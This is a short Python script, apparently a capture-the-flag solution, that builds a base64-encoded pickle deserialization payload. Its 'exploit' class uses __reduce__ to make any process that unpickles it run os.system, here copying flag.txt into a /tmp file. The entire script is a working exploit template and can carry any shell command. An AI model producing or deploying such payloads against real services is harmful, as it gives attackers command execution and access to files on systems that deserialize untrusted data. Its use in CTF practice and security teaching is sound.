import pickle
import base64
from typing import Any
import requests

class exploit(object):
    def __reduce__(self) -> str | tuple[Any, ...]:
        import os
        return(os.system,(b"cat flag.txt >> /tmp/1033a365-6436-4aed-b63d-edd2b3081cdb",
                          ))
    
def send_payload():
    payload = exploit()
    payload = base64.b64encode(pickle.dumps(payload))
    print(payload)

if __name__ == "__main__":
    send_payload()